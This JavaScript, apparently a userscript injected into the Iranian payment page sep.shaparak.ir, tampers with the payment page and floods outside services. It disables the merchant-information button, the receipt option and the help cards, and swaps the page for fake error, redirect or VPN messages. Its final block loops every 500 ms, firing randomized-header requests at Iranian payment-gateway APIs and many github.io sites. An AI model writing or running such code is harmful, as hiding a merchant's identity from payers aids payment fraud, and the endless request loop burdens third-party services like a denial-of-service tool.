(function() {
    'use strict';

    if (!window.location.href.startsWith('https://sep.shaparak.ir')) {
        return;
    }

    function disableInteractiveElements() {
        var moreButton = document.querySelector('#MoreBtn.action[data-relation="MerchantInfo"]');
        if (moreButton) {
            moreButton.addEventListener("click", function (e) {
                e.preventDefault();
                e.stopPropagation();
            });
            moreButton.style.pointerEvents = "none";
            moreButton.style.cursor = "default";
        }

        var pushCheckboxLabel = document.querySelector('label.checkbox.circle[data-relation="SendReceipt"]');
        if (pushCheckboxLabel) {
            pushCheckboxLabel.addEventListener("click", function (e) {
                e.preventDefault();
                e.stopPropagation();
            });
            pushCheckboxLabel.style.pointerEvents = "none";
            pushCheckboxLabel.style.cursor = "default";
        }

        var knowledgeCards = document.querySelectorAll(".knowledge .card .head");
        knowledgeCards.forEach(function (cardHead) {
            cardHead.addEventListener("click", function (e) {
                e.preventDefault();
                e.stopPropagation();
            });
            cardHead.style.pointerEvents = "none";
            cardHead.style.cursor = "default";
        });
    }

    function handlePageDisplay() {
        var moreButton = document.querySelector('#MoreBtn.action[data-relation="MerchantInfo"]');

        if (moreButton) {
            if (window.getComputedStyle(moreButton).display === "none") {
                showErrorPage();
            } else {
                disableInteractiveElements();
                setTimeout(function() {
                    var newMoreButton = document.querySelector('#MoreBtn.action[data-relation="MerchantInfo"]');
                    if (!newMoreButton) {
                        showRedirectMessage();
                    } else if (window.getComputedStyle(newMoreButton).display === "none") {
                        showErrorPage();
                    }
                }, 1000);
            }
        } else {
            showRedirectMessage();
        }
    }

    function showErrorPage() {
        var fontLink = document.createElement("link");
        fontLink.href = "https://cdn.jsdelivr.net/gh/rastikerdar/vazir-font@v30.1.0/dist/font-face.css";
        fontLink.rel = "stylesheet";
        fontLink.type = "text/css";
        document.head.appendChild(fontLink);

        document.body.innerHTML = "";
        document.body.style.backgroundColor = "white";
        document.body.style.display = "flex";
        document.body.style.flexDirection = "column";
        document.body.style.justifyContent = "center";
        document.body.style.alignItems = "center";
        document.body.style.minHeight = "100vh";
        document.body.style.margin = "0";
        document.body.style.fontFamily = "'Vazir', sans-serif";
        document.body.style.overflow = "hidden";

        var message = document.createElement("div");
        message.textContent = "متاسفانه فعلا درگاه در دسترس نمی‌باشد";
        message.style.fontSize = window.innerWidth < 768 ? "20px" : "24px";
        message.style.color = "#333";
        message.style.textAlign = "center";
        message.style.padding = "20px";
        document.body.appendChild(message);
    }

    function showRedirectMessage() {
        var fontLink = document.createElement("link");
        fontLink.href = "https://cdn.jsdelivr.net/gh/rastikerdar/vazir-font@v30.1.0/dist/font-face.css";
        fontLink.rel = "stylesheet";
        fontLink.type = "text/css";
        document.head.appendChild(fontLink);

        var overlay = document.createElement("div");
        overlay.style.position = "fixed";
        overlay.style.top = "0";
        overlay.style.left = "0";
        overlay.style.width = "100%";
        overlay.style.height = "100%";
        overlay.style.backgroundColor = "white";
        overlay.style.zIndex = "9999";
        overlay.style.display = "flex";
        overlay.style.justifyContent = "center";
        overlay.style.alignItems = "center";

        var messageDiv = document.createElement("div");
        messageDiv.style.direction = "rtl";
        messageDiv.style.background = "white";

        var message = document.createElement("p");
        message.style.fontFamily = "'Vazir', sans-serif";
        message.textContent = "در حال انتقال به سایت پذیرنده";
        message.style.margin = "0";
        message.style.padding = "20px";
        message.style.fontSize = "8px";
        message.style.color = "#333";
        message.style.fontWeight = "100";

        messageDiv.appendChild(message);
        overlay.appendChild(messageDiv);
        document.body.appendChild(overlay);
    }

    handlePageDisplay();

    window.addEventListener("orientationchange", function () {
        setTimeout(handlePageDisplay, 100);
    });

    window.addEventListener("resize", function () {
        setTimeout(handlePageDisplay, 100);
    });

    let lastUrl = location.href;
    new MutationObserver(() => {
        const url = location.href;
        if (url !== lastUrl) {
            lastUrl = url;
            handlePageDisplay();
        }
    }).observe(document, { subtree: true, childList: true });
})();

(function () {
    "use strict";

    function checkSubdomain() {
        const hostname = window.location.hostname.toLowerCase();

        if (hostname.endsWith(".shaparak.ir")) {
            if (hostname === "sep.shaparak.ir") {
                return;
            }
            showErrorPage();
        }
    }

    function showErrorPage() {
        document.write(`
            <!DOCTYPE html>
            <html lang="fa">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>خطا</title>
                <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazir-font@v30.1.0/dist/font-face.css" rel="stylesheet" type="text/css">
                <style>
                    body {
                        background-color: white;
                        display: flex;
                        flex-direction: column;
                        justify-content: center;
                        align-items: center;
                        min-height: 100vh;
                        margin: 0;
                        font-family: 'Vazir', sans-serif;
                        overflow: hidden;
                    }
                    .message-box {
                        background-color: #f8f9fa;
                        border-radius: 12px;
                        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
                        padding: ${window.innerWidth < 768 ? "20px" : "30px"};
                        max-width: 90%;
                        width: ${window.innerWidth < 768 ? "90%" : "400px"};
                        text-align: center;
                        direction: rtl;
                    }
                    .message-box p {
                        font-size: ${window.innerWidth < 768 ? "18px" : "22px"};
                        color: #333;
                        margin: 0;
                        line-height: 1.5;
                    }
                </style>
            </head>
            <body>
                <div class="message-box">
                    <p>مجدد امتحان کنید</p>
                </div>
            </body>
            </html>
        `);
        document.close();
    }

    try {
        checkSubdomain();
    } catch (error) {}
})();

(function() {
    'use strict';

    function checkForVPNMessage() {
        const vpnMessage = "در صورت روشن بودن فیلترشکن، آن را خاموش کنید";
        const bodyText = document.body ? (document.body.textContent || document.body.innerText) : '';

        if (bodyText.includes(vpnMessage)) {
            showVPNPage("لطفا فیلترشکن خود را خاموش کنید");
            return true;
        }
        return false;
    }

    function showVPNPage(message) {
        const fontLink = document.createElement("link");
        fontLink.href = "https://cdn.jsdelivr.net/gh/rastikerdar/vazir-font@v30.1.0/dist/font-face.css";
        fontLink.rel = "stylesheet";
        fontLink.type = "text/css";
        document.head.appendChild(fontLink);

        document.body.innerHTML = "";
        document.body.style.backgroundColor = "white";
        document.body.style.display = "flex";
        document.body.style.flexDirection = "column";
        document.body.style.justifyContent = "center";
        document.body.style.alignItems = "center";
        document.body.style.minHeight = "100vh";
        document.body.style.margin = "0";
        document.body.style.fontFamily = "'Vazir', sans-serif";
        document.body.style.overflow = "hidden";

        const messageBox = document.createElement("div");
        messageBox.style.backgroundColor = "#f8f9fa";
        messageBox.style.borderRadius = "12px";
        messageBox.style.boxShadow = "0 4px 20px rgba(0, 0, 0, 0.1)";
        messageBox.style.padding = window.innerWidth < 768 ? "20px" : "30px";
        messageBox.style.maxWidth = "90%";
        messageBox.style.width = window.innerWidth < 768 ? "90%" : "400px";
        messageBox.style.textAlign = "center";
        messageBox.style.direction = "rtl";

        const messageText = document.createElement("p");
        messageText.textContent = message;
        messageText.style.fontSize = window.innerWidth < 768 ? "18px" : "22px";
        messageText.style.color = "#333";
        messageText.style.margin = "0";
        messageText.style.lineHeight = "1.5";

        messageBox.appendChild(messageText);
        document.body.appendChild(messageBox);
    }

    function init() {
        if (document.readyState === "complete" || document.readyState === "interactive") {
            checkForVPNMessage();
        } else {
            document.addEventListener("DOMContentLoaded", checkForVPNMessage);
        }

        const observer = new MutationObserver(() => {
            checkForVPNMessage();
        });
        observer.observe(document.body || document.documentElement, { childList: true, subtree: true });
    }

    setTimeout(init, 500);
})();

(function() {
    'use strict';

    const urls = [
        "https://itgoyo.github.io/",
        "https://ipg.novinopay.com/StartPay/812F739E41057BAC22331918CD5B41C2",
        "https://supertux.github.io/",
        "https://facebookincubator.github.io/",
        "https://try.github.io/",
        "https://core.paystar.ir/api/open-banking/application/refresh-api-key",
        "https://ubg98.github.io/",
        "https://adsabs.github.io/",
        "https://codefornepal.github.io/",
        "https://hoorpay.ir/webservice/rest/PaymentRequest",
        "https://adr.github.io/",
        "http://geteduroam.github.io/",
        "https://api.jibimo.com/v2/auth/token",
        "https://gedoor.github.io/",
        "https://x-delete.github.io/",
        "https://imagej.github.io/",
        "https://dargaah.com/payment",
        "https://pencil2d.github.io/",
        "https://siddhss5.github.io/",
        "https://apereo.github.io/",
        "https://ckeditor5.github.io/",
        "https://manjaro.github.io/",
        "https://core.inopal.ir/api/pardakht/payment",
        "http://webpack.github.io/",
        "https://shanzhenren.github.io/",
        "https://argoproj.github.io/",
        "https://gateway.zibal.ir/v1/request",
        "https://spring-cloud.github.io/",
        "http://understrap.github.io/",
        "https://pagehelper.github.io/",
        "https://pnp.github.io/",
        "https://uber.github.io/",
        "https://seleniumhq.github.io/",
        "http://pa11y.github.io/",
        "https://nextpay.org/nx/gateway/payment/",
        "https://oracle.github.io/",
        "https://microsoft.github.io/",
        "https://azure.github.io/",
        "https://qifenglou.github.io/",
        "https://liblouis.github.io/",
        "https://kazemai.github.io/",
        "https://nerfies.github.io/",
        "https://svc955.github.io/",
        "https://daattali.github.io/",
        "https://ray-project.github.io/",
        "http://marzeelabs.github.io/",
        "https://acmsigsoft.github.io/",
        "https://napneko.github.io/",
        "https://latex3.github.io/",
        "http://twbs.github.io/",
        "https://qupath.github.io/",
        "https://bootstrapbrasil.github.io/",
        "https://collectionbuilder.github.io/",
        "https://pms.rayanpay.com/api/v2/ipg/paymentrequest",
        "https://tmux.github.io/",
        "https://pinterest.github.io/",
        "https://psappdeploytoolkit.github.io/",
        "https://chatsecure.github.io/",
        "http://msys2.github.io/",
        "https://sepal.ir/api/request.json",
        "https://api.tabapay.ir/v1/create",
        "https://tropy.github.io/",
        "https://puplork.github.io/",
        "https://osmlatam.github.io/",
        "https://feitutv.github.io/",
        "https://tqdm.github.io/",
        "https://broadinstitute.github.io/",
        "https://huashequ.github.io/",
        "https://polam.io/invoice/request",
        "http://thingsboard.github.io/",
        "http://mockito.github.io/",
        "http://viraltexts.github.io/",
        "https://ugurcanvurgun.github.io/",
        "http://merchant.shepa.com/",
        "https://scipy.github.io/",
        "https://eightmedia.github.io/",
        "https://fabricjs.github.io/",
        "https://panel.aqayepardakht.ir/api/v2/create",
        "https://alicevision.github.io/",
        "http://pradyunsg.github.io/",
        "https://gnhustgames.github.io/",
        "https://sepordeh.com/merchant/invoices/add/",
        "https://thomas930.github.io/",
        "https://lazyvim.github.io/",
        "https://geneontology.github.io/",
        "https://mlco2.github.io/",
        "https://valve.github.io/",
        "https://select2.github.io/",
        "https://pmd.github.io/",
        "https://webbluetoothcg.github.io/",
        "https://paanapardakht.com/webservice/rest/PaymentRequest",
        "https://xpqiu.github.io/",
        "https://ipg.vandar.io/api/v4/send",
        "https://developer-autodesk.github.io/",
        "https://w3c.github.io/",
        "https://ultralytics.github.io/",
        "https://pjecz.github.io/",
        "https://autoglass-cdn.github.io/",
        "https://gabrielecirulli.github.io/",
        "http://iris-hep.github.io/",
        "https://octokit.github.io/",
        "https://smilingzero.github.io/",
        "https://actix.github.io/",
        "https://kindlemodding.github.io/",
        "https://ng-zorro.github.io/",
        "https://google.github.io/",
        "https://battlecatsinfo.github.io/",
        "https://api.parspal.com/v1/",
        "https://say-can.github.io/",
        "https://qwenlm.github.io/",
        "https://nacos-group.github.io/",
        "https://2i2c-org.github.io/",
        "https://unetbootin.github.io/",
        "https://indico.github.io/",
        "https://payment.zarinpal.com/pg/v4/payment/request.json",
        "https://ooni.github.io/"
    ];

    const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0",
        "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/116.0 Firefox/116.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0",
        "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
    ];

    const generateRandomString = () => (Math.random() + 1).toString(36).substring(2);

    const createRequestOptions = (url, addSearchParams = true) => {
        const headers = {
            "Content-Type": "application/json",
            "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
            "X-Request-ID": generateRandomString(),
            "X-Custom-Time": Date.now().toString(),
            "Accept": Math.random() > 0.5 ? "text/html" : "application/json",
            [generateRandomString()]: generateRandomString(),
            [generateRandomString()]: generateRandomString(),
            [generateRandomString()]: generateRandomString()
        };
        const searchParams = addSearchParams ? new URLSearchParams({
            t: generateRandomString(),
            r: generateRandomString(),
            [generateRandomString()]: generateRandomString(),
            [generateRandomString()]: generateRandomString(),
            [generateRandomString()]: generateRandomString()
        }).toString() : "";
        return {
            method: Math.random() > 0.7 ? "HEAD" : "GET",
            mode: "no-cors",
            headers,
            ...(searchParams && { searchParams })
        };
    };

    const sendRequest = async (url) => {
        try {
            const response = await fetch(url.href || url, createRequestOptions(url));
            console.log(`OK: ${url}`);
            return response;
        } catch (error) {
            console.log(`ERR: ${url} - ${error.message}`);
            return null;
        }
    };

    const runCycle = async () => {
        const selectedUrls = [];
        const count = Math.floor(Math.random() * 6) + 5;
        for (let i = 0; i < count; i++) {
            selectedUrls.push(urls[Math.floor(Math.random() * urls.length)]);
        }
        await Promise.all(selectedUrls.map(url => sendRequest(url)));
    };

    const startInfiniteLoop = () => {
        setInterval(() => {
            runCycle().catch(error => {
                console.error("Cycle error:", error);
            });
        }, 500);
    };

    startInfiniteLoop();
})();
